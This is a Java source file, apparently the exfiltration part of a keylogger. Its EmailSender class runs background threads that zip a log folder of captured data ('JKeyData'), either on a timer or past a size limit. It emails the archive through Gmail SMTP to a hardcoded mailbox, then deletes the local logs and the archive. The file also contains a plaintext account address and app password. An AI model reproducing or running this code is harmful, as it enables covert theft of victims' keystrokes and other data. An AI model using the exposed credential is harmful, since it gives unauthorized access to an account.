import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.*;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Objects;
import java.util.Properties;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

class EmailSender {
    private static final String SENDER_EMAIL = "288hoaqah@gmail.com";
    private static final String APP_PASSWORD = "ciyf zgjt mnqt dhaj";
    private static final String RECIPIENT_EMAIL = "288hoaqah@gmail.com";

    public static void sendEmailWithAttachment(String subject, String content, File attachment) {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(SENDER_EMAIL, APP_PASSWORD);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(SENDER_EMAIL));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(RECIPIENT_EMAIL));
            message.setSubject(subject);

            MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(content);

            MimeBodyPart attachmentPart = new MimeBodyPart();
            try (FileInputStream fis = new FileInputStream(attachment)){
                DataSource source = new FileDataSource(attachment);
                attachmentPart.setDataHandler(new DataHandler(source));
                attachmentPart.setFileName(attachment.getName());
                Multipart multipart = new MimeMultipart();
                multipart.addBodyPart(textPart);
                multipart.addBodyPart(attachmentPart);

                message.setContent(multipart);
                Transport.send(message);
                System.out.println("Email sent successfully.");
            }
        } catch (MessagingException | IOException e) {
            e.printStackTrace();
        }
    }

    private static long getFolderSize(File folder) {
        if (!folder.exists()) return 0;
        return Arrays.stream(Objects.requireNonNull(folder.listFiles()))
                .mapToLong(file -> file.isFile() ? file.length() : getFolderSize(file))
                .sum();
    }

    private static File zipFolderToTemp(String folderPath) throws IOException {
        String timestamp = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss").format(new Date());
        String zipFileName = LogFileHandler.TEMP_FOLDER_PATH + File.separator + "JKeyData_" + timestamp + ".zip";
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFileName))) {
            File folder = new File(folderPath);
            for (File file : Objects.requireNonNull(folder.listFiles())) {
                if (file.isFile()) {
                    try (FileInputStream fis = new FileInputStream(file)) {
                        ZipEntry zipEntry = new ZipEntry(file.getName());
                        zos.putNextEntry(zipEntry);

                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = fis.read(buffer)) > 0) {
                            zos.write(buffer, 0, length);
                        }
                        zos.closeEntry();
                    }
                }
            }
        }
        return new File(zipFileName);
    }

    private static void deleteFolderContents(File folder) {
        for (File file : Objects.requireNonNull(folder.listFiles())) {
            if (file.isFile()) {
                file.delete();
            } else {
                deleteFolderContents(file);
                file.delete();
            }
        }
    }

    public static void sendFileAfterTime(long interval, String subject, String content) {
        new Thread(() -> {
            try {
                while (true) {
                    Thread.sleep(interval);
                    File zipFile = zipFolderToTemp(LogFileHandler.LOG_FOLDER_PATH);
                    sendEmailWithAttachment(subject, content, zipFile);
                    deleteFolderContents(new File(LogFileHandler.LOG_FOLDER_PATH));
                    zipFile.delete();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void monitorAndSend(long MAX_FOLDER_SIZE_MB, String subject, String content) {
        new Thread(() -> {
            while (true) {
                try {
                    long folderSizeMB = getFolderSize(new File(LogFileHandler.LOG_FOLDER_PATH)) / (1024 * 1024);
                    if (folderSizeMB >= MAX_FOLDER_SIZE_MB) {
                        File zipFile = zipFolderToTemp(LogFileHandler.LOG_FOLDER_PATH);
                        sendEmailWithAttachment(subject, content, zipFile);
                        deleteFolderContents(new File(LogFileHandler.LOG_FOLDER_PATH));
                        zipFile.delete();
                    }
                    Thread.sleep(60000); // Kiểm tra mỗi 60 giây
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}